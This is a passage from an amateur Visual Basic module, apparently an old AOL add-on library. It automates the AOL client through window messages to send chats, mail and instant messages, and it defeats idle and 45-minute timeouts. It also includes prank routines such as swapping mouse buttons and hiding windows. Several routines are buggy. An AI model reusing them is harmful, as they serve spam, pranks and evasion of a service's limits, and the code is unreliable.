Attribute VB_Name = "Darcknight2"
'Ok this is my second version, it is made by me Darcknight
'There is sssooo much more than the last version
'theres from getting the users weather to tiling a pic in a form
'hope u like it
'-Darcknight, PooPTroooP@aol.com
Public Type mnuCommands
Captions As New Collection
Commands As New Collection
End Type
Declare Function SetMenuItemBitmaps Lib "user32" _
(ByVal hMenu As Long, ByVal nPosition As Long, _
ByVal wFlags As Long, ByVal hBitmapUnchecked As Long, _
ByVal hBitmapChecked As Long) As Long

Public Const MF_BITMAP = &H4&

Type MENUITEMINFO
    cbSize As Long
    fMask As Long
    fType As Long
    fState As Long
    wID As Long
    hSubMenu As Long
    hbmpChecked As Long
    hbmpUnchecked As Long
    dwItemData As Long
    dwTypeData As String
    cch As Long
End Type

Public Type filetype
Commands As mnuCommands
Extension As String
ProperName As String
FullName As String
ContentType As String
IconPath As String
IconIndex As Integer
End Type
Public Const REG_SZ = 1
Public Const HKEY_CLASSES_ROOT = &H80000000

Public Declare Function RegCloseKey Lib _
"advapi32.dll" (ByVal hKey As Long) As Long
Public Declare Function RegCreateKey Lib _
"advapi32" Alias "RegCreateKeyA" (ByVal _
hKey As Long, ByVal lpszSubKey As String, _
phkResult As Long) As Long
Public Declare Function RegSetValueEx Lib _
"advapi32" Alias "RegSetValueExA" (ByVal _
hKey As Long, ByVal lpszValueName As String, _
ByVal dwReserved As Long, ByVal fdwType As _
Long, lpbData As Any, ByVal cbData As Long) As Long

Private Declare Sub keybd_event Lib "user32" _
  (ByVal bVk As Byte, _
  ByVal bScan As Byte, _
  ByVal dwFlags As Long, _
   ByVal dwExtraInfo As Long)
   Private Const VK_LWIN = &H5B
   Private Const KEYEVENTF_KEYUP = &H2
   Private Const VK_APPS = &H5D
Public Const MAX_WSADescription = 256
Public Const MAX_WSASYSStatus = 128
Public Const ERROR_SUCCESS       As Long = 0
Public Const WS_VERSION_REQD     As Long = &H101
Public Const WS_VERSION_MAJOR    As Long = WS_VERSION_REQD \ &H100 And &HFF&
Public Const WS_VERSION_MINOR    As Long = WS_VERSION_REQD And &HFF&
Public Const MIN_SOCKETS_REQD    As Long = 1
Public Const SOCKET_ERROR        As Long = -1

Public Type HOSTENT
   hName      As Long
   hAliases   As Long
   hAddrType  As Integer
   hLen       As Integer
   hAddrList  As Long
End Type

Public Type WSADATA
   wVersion      As Integer
   wHighVersion  As Integer
   szDescription(0 To MAX_WSADescription)   As Byte
   szSystemStatus(0 To MAX_WSASYSStatus)    As Byte
   wMaxSockets   As Integer
   wMaxUDPDG     As Integer
   dwVendorInfo  As Long
End Type
Public Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Public Declare Function WSAGetLastError Lib "WSOCK32.DLL" () As Long

Public Declare Function WSAStartup Lib "WSOCK32.DLL" _
   (ByVal wVersionRequired As Long, lpWSADATA As WSADATA) As Long
   
Public Declare Function WSACleanup Lib "WSOCK32.DLL" () As Long

Public Declare Function gethostname Lib "WSOCK32.DLL" _
   (ByVal szHost As String, ByVal dwHostLen As Long) As Long
   
Public Declare Function gethostbyname Lib "WSOCK32.DLL" _
   (ByVal szHost As String) As Long
   
Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" _
   (hpvDest As Any, ByVal hpvSource As Long, ByVal cbCopy As Long)
Declare Function DeleteObject Lib "gdi32" (ByVal hObject As Long) As Long
Declare Function FillRect Lib "user32" (ByVal hDC As Long, lpRect As RECT, ByVal hBrush As Long) As Long
Declare Function CreateSolidBrush Lib "gdi32" (ByVal crColor As Long) As Long
Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Declare Function SwapMouseButton Lib "user32" (ByVal bSwap As Long) As Long
Declare Function GetDoubleClickTime Lib "user32" () As Long
Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Global Const SWP_NOMOVE = 2
Global Const SWP_NOSIZE = 1
Global Const Flags = SWP_NOMOVE Or SWP_NOSIZE
Global Const HWND_TOPMOST = -1
Global Const HWND_NOTOPMOST = -2
Declare Function CreateBubble% Lib "bubble.dll" (ByVal X%, ByVal Y%, ByVal xs%, ByVal ys%, ByVal Title$, ByVal Txt$)
Declare Function DeleteBubble% Lib "bubble.dll" (ByVal wnd%)
Declare Function ReleaseCapture Lib "user32" () As Long
Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Declare Function CountClipboardFormats Lib "user32" () As Long
Public Const WM_SETTEXT = &HC
Public Const WM_CLOSE = &H10
Public Const WM_GETTEXTLENGTH = &HE
Declare Function MciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Declare Function sendmessagebystring Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long
Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Declare Function GetClassName Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long
Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Declare Function SendMessageByNum& Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long)
Declare Function SetFocusAPI Lib "user32" Alias "SetFocus" (ByVal hwnd As Long) As Long
Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Declare Function ShowCursor& Lib "user32" _
(ByVal bShow As Long)
Declare Function IsWindowEnabled Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As String, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long
Private Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Sub RtlMoveMemory Lib "kernel32" (ByRef dest As Any, ByRef source As Any, ByVal nBytes As Long)
Declare Function RedrawWindow Lib "user32" (ByVal hwnd As Long, lprcUpdate As RECT, ByVal hrgnUpdate As Long, ByVal fuRedraw As Long) As Long
Declare Function movewindow Lib "user32" Alias "MoveWindow" (ByVal hwnd As Long, ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal bRepaint As Long) As Long
Declare Function GetWindowRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long
Declare Function SetRect Lib "user32" (lpRect As RECT, ByVal X1 As Long, ByVal Y1 As Long, ByVal x2 As Long, ByVal Y2 As Long) As Long
Declare Function setparent Lib "user32" Alias "SetParent" (ByVal hWndChild As Long, ByVal hWndNewParent As Long) As Long
Declare Function dwGetStringFromLPSTR Lib "dwspy32.dll" (ByVal lpcopy As Long) As String
Declare Sub dwCopyDataBynum Lib "dwspy32.dll" Alias "dwCopyData" (ByVal source&, ByVal dest&, ByVal nCount&)
Declare Function dwGetAddressForObject& Lib "dwspy32.dll" (object As Any)
Declare Sub dwCopyDataByString Lib "dwspy32.dll" Alias "dwCopyData" (ByVal source As String, ByVal dest As Long, ByVal nCount&)
Declare Function dwXCopyDataBynumFrom& Lib "dwspy32.dll" Alias "dwXCopyDataFrom" (ByVal mybuf As Long, ByVal foreignbuf As Long, ByVal size As Integer, ByVal foreignPID As Long)
Declare Function dwGetWndInstance& Lib "dwspy32.dll" (ByVal hwnd&)
Declare Function RegisterWindowMessage& Lib "user32" Alias "RegisterWindowMessageA" (ByVal lpString As String)
Declare Function GetWindowLong& Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long)
Declare Function EnumWindows& Lib "user32" (ByVal lpenumfunc As Long, ByVal lParam As Long)


Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Declare Function DrawMenuBar Lib "user32" (ByVal hwnd As Long) As Long
Declare Function ShellAbout Lib "shell32.dll" Alias "ShellAboutA" (ByVal hwnd As Long, ByVal szApp As String, ByVal szOtherStuff As String, ByVal hIcon As Long) As Long
Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long



Declare Function CreatePopupMenu Lib "user32" () As Long

Declare Function GetSubMenu Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Declare Function GetMenuItemID Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Declare Function GetMenu Lib "user32" (ByVal hwnd As Long) As Long
Declare Function GetMenuItemCount Lib "user32" (ByVal hMenu As Long) As Long
Declare Function GetMenuItemInfo Lib "user32" _
Alias "GetMenuItemInfoA" (ByVal hMenu As Long, _
ByVal un As Long, ByVal B As Boolean, _
lpMenuItemInfo As MENUITEMINFO) As Boolean


Declare Function Gettopwindow Lib "user32" Alias "GetTopWindow" (ByVal hwnd As Long) As Long


Declare Function GetMenuString Lib "user32" Alias "GetMenuStringA" (ByVal hMenu As Long, ByVal wIDItem As Long, ByVal lpString As String, ByVal nMaxCount As Long, ByVal wFlag As Long) As Long

Public Const WM_RBUTTONDOWN = &H204
Public Const WM_RBUTTONUP = &H205

Declare Function InsertMenu Lib "user32" Alias "InsertMenuA" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function AppendMenu Lib "user32" Alias "AppendMenuA" (ByVal hMenu As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function RemoveMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DeleteMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DestroyMenu Lib "user32" (ByVal hMenu%) As Integer
Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long

Declare Function ExitWindowsEx& Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long)
Public Const EWX_FORCE = 4
Public Const EWX_LOGOFF = 0
Public Const EWX_REBOOT = 2
Public Const EWX_SHUTDOWN = 1

Declare Function EnableWindow Lib "user32" (ByVal hwnd As Long, ByVal cmd As Long) As Long

Global Const GFSR_SYSTEMRESOURCES = 0
Global Const GFSR_GDIRESOURCES = 1
Global Const GFSR_USERRESOURCES = 2

Global Const WM_MDICREATE = &H220
Global Const WM_MDIDESTROY = &H221
Global Const WM_MDIACTIVATE = &H222
Global Const WM_MDIRESTORE = &H223
Global Const WM_MDINEXT = &H224
Global Const WM_MDIMAXIMIZE = &H225
Global Const WM_MDITILE = &H226
Global Const WM_MDICASCADE = &H227
Global Const WM_MDIICONARRANGE = &H228
Global Const WM_MDIGETACTIVE = &H229
Global Const WM_MDISETMENU = &H230


Global Const WM_CUT = &H300
Global Const WM_COPY = &H301
Global Const WM_PASTE = &H302
Public Const WM_CHAR = &H102

Public Const WM_USER = &H400
Public Const WM_KEYDOWN = &H100
Public Const WM_KEYUP = &H101
Public Const WM_LBUTTONDOWN = &H201
Public Const WM_LBUTTONUP = &H202

Public Const WM_COMMAND = &H111
Public Const WM_CLEAR = &H303
Public Const WM_DESTROY = &H2
Public Const WM_GETTEXT = &HD

Public Const WM_LBUTTONDBLCLK = &H203
Public Const BM_GETCHECK = &HF0
Public Const BM_GETSTATE = &HF2
Public Const BM_SETCHECK = &HF1
Public Const BM_SETSTATE = &HF3

Public Const LB_GETITEMDATA = &H199
Public Const LB_GETCOUNT = &H18B
Public Const LB_ADDSTRING = &H180
Public Const LB_DELETESTRING = &H182
Public Const LB_FINDSTRING = &H18F
Public Const LB_FINDSTRINGEXACT = &H1A2
Public Const LB_GETCURSEL = &H188
Public Const LB_GETTEXT = &H189
Public Const LB_GETTEXTLEN = &H18A
Public Const LB_SELECTSTRING = &H18C
Public Const LB_SETCOUNT = &H1A7
Public Const LB_SETCURSEL = &H186
Public Const LB_SETSEL = &H185
Public Const LB_INSERTSTRING = &H181

Public Const VK_HOME = &H24
Public Const VK_RIGHT = &H27
Public Const VK_CONTROL = &H11
Public Const VK_DELETE = &H2E
Public Const VK_DOWN = &H28
Public Const VK_LEFT = &H25
Public Const VK_RETURN = &HD
Public Const VK_SPACE = &H20
Public Const VK_TAB = &H9

Public Const HWND_TOP = 0



Global Const SND_SYNC = &H0
Global Const SND_ASYNC = &H1
Global Const SND_NODEFAULT = &H2
Global Const SND_LOOP = &H8
Global Const SND_NOSTOP = &H10

Public Const GW_CHILD = 5
Public Const GW_HWNDFIRST = 0
Public Const GW_HWNDLAST = 1
Public Const GW_HWNDNEXT = 2
Public Const GW_HWNDPREV = 3
Public Const GW_MAX = 5
Public Const GW_OWNER = 4
Public Const SW_MAXIMIZE = 3
Public Const SW_MINIMIZE = 6
Public Const SW_Hide = 0
Public Const SW_RESTORE = 9
Public Const SW_Show = 5
Public Const SW_SHOWDEFAULT = 10
Public Const SW_SHOWMAXIMIZED = 3
Public Const SW_SHOWMINIMIZED = 2
Public Const SW_SHOWMINNOACTIVE = 7
Public Const SW_SHOWNOACTIVATE = 4
Public Const SW_SHOWNORMAL = 1

Public Const MF_APPEND = &H100&
Public Const MF_DELETE = &H200&
Public Const MF_CHANGE = &H80&
Public Const MF_Enabled = &H0&
Public Const MF_DISABLED = &H2&
Public Const MF_REMOVE = &H1000&
Public Const MF_Popup = &H10&
Public Const MF_String = &H0&
Public Const MF_UNCHECKED = &H0&
Public Const MF_CHECKED = &H8&
Public Const MF_GRAYED = &H1&
Public Const MF_BYPOSITION = &H400&
Public Const MF_BYCOMMAND = &H0&

Public Const GWW_HINSTANCE = (-6)
Public Const GWW_ID = (-12)
Public Const GWL_STYLE = (-16)

Public Const PROCESS_VM_READ = &H10
Public Const STANDARD_RIGHTS_REQUIRED = &HF0000

Public Const CB_ADDSTRING = &H143
Public Const CB_GETCOUNT = &H146
Public Const CB_INSERTSTRING = &H14A
Public Const CB_SELECTSTRING = &H14D


Type RECT
   Left As Long
   Top As Long
   Right As Long
   Bottom As Long
End Type

Type POINTAPI
   X As Long
   Y As Long
End Type
Public Sub CreateExtension(newfiletype As filetype)
Dim IconString As String
Dim Result As Long, Result2 As Long, ResultX As Long
Dim ReturnValue As Long, HKeyX As Long
Dim cmdloop As Integer
IconString = newfiletype.IconPath & "," & _
newfiletype.IconIndex
If Left$(newfiletype.Extension, 1) <> "." Then _
newfiletype.Extension = "." & newfiletype.Extension
RegCreateKey HKEY_CLASSES_ROOT, _
newfiletype.Extension, Result
ReturnValue = RegSetValueEx(Result, "", 0, REG_SZ, _
ByVal newfiletype.ProperName, _
LenB(StrConv(newfiletype.ProperName, vbFromUnicode)))
If newfiletype.ContentType <> "" Then
ReturnValue = RegSetValueEx(Result, _
"Content Type", 0, REG_SZ, ByVal _
CStr(newfiletype.ContentType), _
LenB(StrConv(newfiletype.ContentType, vbFromUnicode)))
End If
RegCreateKey HKEY_CLASSES_ROOT, _
newfiletype.ProperName, Result
If Not IconString = ",0" Then
RegCreateKey Result, "DefaultIcon", _
Result2
ReturnValue = RegSetValueEx(Result2, _
"", 0, REG_SZ, ByVal IconString, _
LenB(StrConv(IconString, vbFromUnicode)))
End If
ReturnValue = RegSetValueEx(Result, _
"", 0, REG_SZ, ByVal newfiletype.FullName, _
LenB(StrConv(newfiletype.FullName, vbFromUnicode)))
RegCreateKey Result, ByVal "Shell", ResultX
For cmdloop = 1 To newfiletype.Commands.Captions.Count
RegCreateKey ResultX, ByVal _
newfiletype.Commands.Captions(cmdloop), Result
RegCreateKey Result, ByVal "Command", Result2
Dim CurrentCommand$
CurrentCommand = newfiletype.Commands.Commands(cmdloop)
ReturnValue = RegSetValueEx(Result2, _
"", 0, REG_SZ, ByVal CurrentCommand$, _
LenB(StrConv(CurrentCommand$, vbFromUnicode)))
RegCloseKey Result
RegCloseKey Result2
Next
RegCloseKey Result2
End Sub


Sub ClickTheButton(icon%)
a% = SendMessage(icon%, WM_LBUTTONDOWN, 0, 0&)
a% = SendMessage(icon%, WM_LBUTTONUP, 0, 0&)
End Sub



Sub AOLsHandle()
aol = "AOL Frame25"
End Sub
Sub GetNumberOfCharacters()
'If you don't want to use AOL, then type in the Window Class Name
'In place of "AOL Frame25"
a = FindWindow("AOL Frame25", vbNullString)
B = SendMessage(a, WM_GETTEXTLENGTH, 0, 0)
B = NumberOfChar
End Sub

Sub CloseAOLWindow()
'If you don't want to use AOL, then type in the Window Class Name
'In place of "AOL Frame25"
a = FindWindow("AOL Frame25", vbNullString)
B = SendMessage(a, WM_CLOSE, 0, 0)
End Sub
Sub ChangeAOLCaption()
'If you don't want to use AOL, then type in the Window Class Name
'In place of "AOL Frame25"
a = FindWindow("AOL Frame25", vbNullString)
B = SendMessage(a, WM_SETTEXT, 0, 0) '2nd 0 is where the text goes
End Sub
Sub HideAOLWindow()
Dim VB%
VB% = FindWindow("AOL Frame25", vbNullString)
Call ShowWindow(VB%, 0)
End Sub
Sub ShowAOLWindow()
a = FindWindow("AOL Frame25", vbNullString)
Call ShowWindow(a, 5)
End Sub

Sub SwapMouseButtons()
a = SwapMouseButton(12)
End Sub
Sub GetDoubleClicksSpeed()
a = GetDoubleClickTime
a = dblClkSpd
End Sub
Sub Formwith0border()
'Put this under MouseDown proc
If Button <> 1 Then Exit Sub
  Dim ReturnVal%
  ReleaseCapture
  ReturnVal% = SendMessage(hwnd, &HA1, 2, 0)
End Sub
Public Sub AOLclass()
'If you don't want to use AOL Frame25 blah blah blah, then type in the Window Class Name
'In place of "AOL Frame25"
a = FindWindow("AOL Frame25", vbNullString)
End Sub
Sub CountClipboradFormat()
a = CountClipboardFormats
a = ClipNum
End Sub

Sub CloseCDDoor()
retvalue = MciSendString("set CDAudio door closed", _
returnstring, 127, 0)
End Sub
Sub OpenCDDoor()
retvalue = MciSendString("set CDAudio door open", _
returnstring, 127, 0)
End Sub
Sub ChangeCaptionByString(newcaption As String)
a = FindWindow("AOL Frame25", vbNullString)
B = sendmessagebystring(a, WM_SETTEXT, 0, newcaption)
End Sub
Sub pause(interval)
'pause/waits for "interval" seconds
Current = Timer
Do While Timer - Current < Val(interval)
DoEvents
Loop
End Sub
Sub UNSwapMouseButtons()
a = SwapMouseButton(0)
End Sub

Function FindChatRoom()
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
room% = FindChildByClass(mdi%, "AOL Child")
STUFF% = FindChildByClass(room%, "_AOL_Listbox")
MoreStuff% = FindChildByClass(room%, "RICHCNTL")
If STUFF% <> 0 And MoreStuff% <> 0 Then
   FindChatRoom = room%
Else:
   FindChatRoom = 0
End If
End Function
Function FindChildByClass(parentw, childhand)
firs% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(parentw, GW_CHILD)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone

While firs%
firss% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(firss%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(firs%, 2)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
Wend
FindChildByClass = 0

bone:
room% = firs%
FindChildByClass = room%

End Function
Function FindChildByTitle(parentw, childhand)
firs% = GetWindow(parentw, 5)
If UCase(GetCaption(firs%)) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(parentw, GW_CHILD)

While firs%
firss% = GetWindow(parentw, 5)
If UCase(GetCaption(firss%)) Like UCase(childhand) & "*" Then GoTo bone
firs% = GetWindow(firs%, 2)
If UCase(GetCaption(firs%)) Like UCase(childhand) & "*" Then GoTo bone
Wend
FindChildByTitle = 0

bone:
room% = firs%
FindChildByTitle = room%
End Function

Function GetClass(child)
buffer$ = String$(250, 0)
getclas% = GetClassName(child, buffer$, 250)
GetClass = buffer$
End Function


Function UserSN()
On Error Resume Next
aol% = FindWindow("AOL Frame25", "America  Online")
mdi% = FindChildByClass(aol%, "MDIClient")
welcome% = FindChildByTitle(mdi%, "Welcome, ")
welcomelength% = GetWindowTextLength(welcome%)
welcometitle$ = String$(200, 0)
a% = GetWindowText(welcome%, welcometitle$, (welcomelength% + 1))
User = Mid$(welcometitle$, 10, (InStr(welcometitle$, "!") - 10))
UserSN = User
End Function
Sub ChangeWindowCap(WindowClassName, NewName As String)
B = sendmessagebystring(WindowClassName, WM_SETTEXT, 0, NewName)
End Sub
Sub KillWelcome()
aol% = FindWindow("AOL Frame25", "America  Online")
mdi% = FindChildByClass(aol%, "MDIClient")
welcome% = FindChildByTitle(mdi%, "Welcome, ")
a = SendMessage(welcome%, WM_CLOSE, 0, 0)
End Sub
Sub KillWait()

aol% = FindWindow("AOL Frame25", vbNullString)
aotool% = FindChildByClass(aol%, "AOL Toolbar")
aotool2% = FindChildByClass(aotool%, "_AOL_Toolbar")

aoicon% = FindChildByClass(aotool2%, "_AOL_Icon")

For GetIcon = 1 To 19
    aoicon% = GetWindow(aoicon%, 2)
Next GetIcon

Call timeout(0.05)
ClickIcon (aoicon%)

Do: DoEvents
mdi% = FindChildByClass(aol%, "MDIClient")
keywordwin% = FindChildByTitle(mdi%, "Keyword")
aoedit% = FindChildByClass(keywordwin%, "_AOL_Edit")
aoicon2% = FindChildByClass(keywordwin%, "_AOL_Icon")
Loop Until keywordwin% <> 0 And aoedit% <> 0 And aoicon2% <> 0

Call SendMessage(keywordwin%, WM_CLOSE, 0, 0)
End Sub
Function IsUserOnline()
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
welcome% = FindChildByTitle(mdi%, "Welcome,")
If welcome% <> 0 Then
   IsUserOnline = 1
Else:
   IsUserOnline = 0
End If
End Function
Function GetCaption(hwnd)
Dim hwndLength%
hwndLength% = GetWindowTextLength(hwnd)
hwndTitle$ = String$(hwndLength%, 0)
a% = GetWindowText(hwnd, hwndTitle$, (hwndLength% + 1))

GetCaption = hwndTitle$
End Function

Sub SendChat(Chat)
room% = FindChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")

AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusAPI(AORich%)
Call sendmessagebystring(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
End Sub

Sub timeout(duration)
starttime = Timer
Do While Timer - starttime < duration
DoEvents
Loop

End Sub

Sub StayOnTop(TheForm As Form)
SetWinOnTop = SetWindowPos(TheForm.hwnd, HWND_TOPMOST, 0, 0, 0, 0, Flags)
End Sub
Sub unstayontop()
SetWinOnTop = SetWindowPos(TheForm.hwnd, HWND_NOTOPMOST, 0, 0, 0, 0, Flags)
End Sub

Sub Anti45MinTimer(AntiOn As Boolean, AntiOff As Boolean, tmr As Timer)
'Put This In A Timer!!!!:
' Call anti45mintimer(True,False,timer1)
If AntiOn = True Then
tmr.Enabled = True
End If
If AntiOff = True Then
tmr.Enabled = False
End If
If tmr.Enabled = True Then
AOTimer% = FindWindow("_AOL_Palette", vbNullString)
aoicon% = FindChildByClass(AOTimer%, "_AOL_Icon")
ClickIcon (aoicon%)
End If
End Sub
Sub AntiIdle(AntiOn As Boolean, AntiOff As Boolean, tmr As Timer)
'Put This In A Timer!!!!:
' Call antiIdle(True,False,timer1)
If AntiOn = True Then
tmr.Enabled = True
End If
If AntiOff = True Then
tmr.Enabled = False
End If
If tmr.Enabled = True Then
AOModal% = FindWindow("_AOL_Modal", vbNullString)
aoicon% = FindChildByClass(AOModal%, "_AOL_Icon")
ClickIcon (aoicon%)
End If
End Sub
Sub ClickIcon(icon%)
Click% = SendMessage(icon%, WM_LBUTTONDOWN, 0, 0&)
Click% = SendMessage(icon%, WM_LBUTTONUP, 0, 0&)
End Sub
Sub SendMail(Recipiants, subject, message)

aol% = FindWindow("AOL Frame25", vbNullString)
aotool% = FindChildByClass(aol%, "AOL Toolbar")
aotool2% = FindChildByClass(aotool%, "_AOL_Toolbar")
aoicon% = FindChildByClass(aotool2%, "_AOL_Icon")

aoicon% = GetWindow(aoicon%, 2)

ClickIcon (aoicon%)

Do: DoEvents
mdi% = FindChildByClass(aol%, "MDIClient")
AOMail% = FindChildByTitle(mdi%, "Write Mail")
aoedit% = FindChildByClass(AOMail%, "_AOL_Edit")
AORich% = FindChildByClass(AOMail%, "RICHCNTL")
aoicon% = FindChildByClass(AOMail%, "_AOL_Icon")
Loop Until AOMail% <> 0 And aoedit% <> 0 And AORich% <> 0 And aoicon% <> 0

Call sendmessagebystring(aoedit%, WM_SETTEXT, 0, Recipiants)

aoedit% = GetWindow(aoedit%, 2)
aoedit% = GetWindow(aoedit%, 2)
aoedit% = GetWindow(aoedit%, 2)
aoedit% = GetWindow(aoedit%, 2)
Call sendmessagebystring(aoedit%, WM_SETTEXT, 0, subject)
Call sendmessagebystring(AORich%, WM_SETTEXT, 0, message)

For GetIcon = 1 To 18
    aoicon% = GetWindow(aoicon%, 2)
Next GetIcon

ClickIcon (aoicon%)

Do: DoEvents
AOError% = FindChildByTitle(mdi%, "Error")
AOModal% = FindWindow("_AOL_Modal", vbNullString)
If AOMail% = 0 Then Exit Do
If AOModal% <> 0 Then
aoicon% = FindChildByClass(AOModal%, "_AOL_Icon")
ClickIcon (aoicon%)
Call SendMessage(AOMail%, WM_CLOSE, 0, 0)
Exit Sub
End If
If AOError% <> 0 Then
Call SendMessage(AOError%, WM_CLOSE, 0, 0)
Call SendMessage(AOMail%, WM_CLOSE, 0, 0)
Exit Do
End If
Loop
End Sub
Function FreeProcess()
Do: DoEvents
Process = Process + 1
If Process = 50 Then Exit Do
Loop
End Function

Sub KeyWord(TheKeyword As String)
aol% = FindWindow("AOL Frame25", vbNullString)
aotool% = FindChildByClass(aol%, "AOL Toolbar")
aotool2% = FindChildByClass(aotool%, "_AOL_Toolbar")

aoicon% = FindChildByClass(aotool2%, "_AOL_Icon")

For GetIcon = 1 To 20
    aoicon% = GetWindow(aoicon%, 2)
Next GetIcon
' If you are using KillGlyph, u need to replace
' the above For GetIcon = 1 To 20 code to this:
'For GetIcon = 1 To 19
'    AOIcon% = GetWindow(AOIcon%, 2)
'Next GetIcon

Call timeout(0.05)
ClickIcon (aoicon%)

Do: DoEvents
mdi% = FindChildByClass(aol%, "MDIClient")
keywordwin% = FindChildByTitle(mdi%, "Keyword")
aoedit% = FindChildByClass(keywordwin%, "_AOL_Edit")
aoicon2% = FindChildByClass(keywordwin%, "_AOL_Icon")
Loop Until keywordwin% <> 0 And aoedit% <> 0 And aoicon2% <> 0

Call sendmessagebystring(aoedit%, WM_SETTEXT, 0, TheKeyword)

Call timeout(0.05)
ClickIcon (aoicon2%)
ClickIcon (aoicon2%)

End Sub
Function WinCaption(win)
WinTextLength% = GetWindowTextLength(win)
WinTitle$ = String$(hwndLength%, 0)
GetWinText% = GetWindowText(win, WinTitle$, (WinTextLength% + 1))
WinCaption = WinTitle$
End Function

Sub IMBuddy(Recipiant, message)

aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
buddy% = FindChildByTitle(mdi%, "Buddy List Window")

If buddy% = 0 Then
    KeyWord ("BuddyView")
    Do: DoEvents
    Loop Until buddy% <> 0
End If

aoicon% = FindChildByClass(buddy%, "_AOL_Icon")

For l = 1 To 2
    aoicon% = GetWindow(aoicon%, 2)
Next l

Call timeout(0.01)
ClickIcon (aoicon%)

Do: DoEvents
IMWin% = FindChildByTitle(mdi%, "Send Instant Message")
aoedit% = FindChildByClass(IMWin%, "_AOL_Edit")
AORich% = FindChildByClass(IMWin%, "RICHCNTL")
aoicon% = FindChildByClass(IMWin%, "_AOL_Icon")
Loop Until aoedit% <> 0 And AORich% <> 0 And aoicon% <> 0
Call sendmessagebystring(aoedit%, WM_SETTEXT, 0, Recipiant)
Call sendmessagebystring(AORich%, WM_SETTEXT, 0, message)

For X = 1 To 9
    aoicon% = GetWindow(aoicon%, 2)
Next X

Call timeout(0.01)
ClickIcon (aoicon%)

Do: DoEvents
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
IMWin% = FindChildByTitle(mdi%, "Send Instant Message")
OkWin% = FindWindow("#32770", "America Online")
If OkWin% <> 0 Then Call SendMessage(OkWin%, WM_CLOSE, 0, 0): closer2 = SendMessage(IMWin%, WM_CLOSE, 0, 0): Exit Do
If IMWin% = 0 Then Exit Do
Loop

End Sub
Sub IMKeyword(Recipiant, message)
aol% = FindWindow("AOL Frame25", vbNullString)
